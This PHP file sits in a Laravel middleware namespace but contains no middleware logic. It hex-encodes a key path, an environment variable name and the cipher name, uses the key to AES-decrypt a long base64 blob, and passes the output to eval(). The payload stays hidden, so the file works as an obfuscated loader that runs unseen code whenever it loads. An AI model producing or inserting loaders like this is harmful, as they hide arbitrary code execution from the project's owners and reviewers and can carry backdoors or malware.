<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TjAcY6mv6401F1st8N4Fww==');

$c=base64_decode(

'hP6DwcIZIFo1rrGJ3ODwMdpy7FUXBXDwjqfarpdoRKJFwSQDN0NeynWtXXvT2g4ZXJAf+TN4eUvH' .
'aaHg+gPc//zDhtWRcwOPiRTLjdJLJhXdbI+znASM2ZgYXGgeI4iQd06rl2M/CiTxBJcviNPpAOiH' .
'o0Fo6HBbPWRW8oc1E3TBr3mSNeLXeh0SHw68XM2MjzRXkaD16nQemDCL041SboqwQb9Z+zJkcjWE' .
'jyNU1KbpSLmioj7v7Cyn77YW8/H9BdqwNj03/oeJ26nSsZVYzgjHM4K74UH6C0hKze34AdiEtSNl' .
'iaSVyXPMCUPhAzaFbdxXP5SxB56b83Zytg17Ri+pdVMrXXl4jEcjvjE2rlSSs70+xrYjgd3QdJCi' .
'KJhAyUwx72dS+EDFJ3R6jzkq+TO61VjgPXI46y1M3B8WKTK+zxxYNo5UEsnWqfr0QCnAkTac5d3t' .
'C0vFfxdVHuf+W2VNOQfc1xCB0WfEl48/IsJvA355FfyxhKVQL46Bbuuj1LW+Ny2bAItN/xmopDiU' .
'+sm6MCPWFUDEXQcoy2BcPNpwGT8RMBoyKTjoXXSH2+x7UIyKFaMB9RuYMhxIGMTZW76Y1Xws59sN' .
'WAC/1sdkqUZ+zaZyG64uM1EDHrFVDYRgJu+CngzKk2P5Wwx8EzYabnqevVh2qq0tiG6rup+eTN4S' .
'OWvMkJQdC1ffGTwtw0ejqEU3b0GogdOiFiInDarhZPTOSIpAtf2TWPZgeDp7PBblYrcYQzOUcdsV' .
'HJ9W23NtFh8SujEYPBMRSlnBBQnQDIDVtx0u2TlVqtEd4kwB2SYpdgz6O3VHr/TcdJfk3d9QRr2F' .
'KPeNblmQ8lTVk6NupDUiyfS90qMgFZepd/8lRbRQj04Nbk9e2HVghajYKXiO39fjPB4qRZ39b3RG' .
'mFi7zYOnSkCZRlUABDnacaTpDZfPVlsoed5p23gdIQb9VVUUbI+hGWMVzgFlhrzWfIDJV2Jz1wJS' .
'U8VMRBdZaG6pzCwrz37tTEmBK7WkDv6hU0whwj0h7c6bhB/gXqpEwICVhHsSWlAVjHRl3gTDPA7K' .
'WAoQWeTx00yN+gEMc09Prn8HWuRfB3J7bGoGgMhJjmQvlFDyUAsyAcLr9shiZ4w9SQuxlWPyF0zK' .
'sbMrg8Yy/G6KYckv38XfGi/vn5t7vTR2ZCuv91UNk3XLkPEfrcdlNGgnxKFBJB16td2Xp0UtpLMc' .
'xSUlQopPGOiUd5zqdyvXYk5vkhdBbNjqO6OCcRvDgoZx8TBlFAMExhB9qTEcYg+BJJ6cV9HBZJGg' .
'fUQ02suF1BsnuZoIIzrfd65SshD3kUkUTvcMDSbNYFxLgV34pwbQ5vdqN8iUm5ClphAxO7KJ8VOc' .
'oeeaIYYfyjQu9Pe1LKo3KpKtpWOAbhUVFh5XGYjrf3zQHbzyj7xhfoii/gtB7ZXd7mu2LePrFXNl' .
'2wPF6yk36HzQbUg4ALI//IzH1/1RbbcKDN5tAKDDAi1UtkuK3MMmJKJEwlkHYlIh6u8wXSO5OO70' .
'kkf/KscPtzR1cP6cz4Lti8zwTvBpNQ2tZWnNJw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

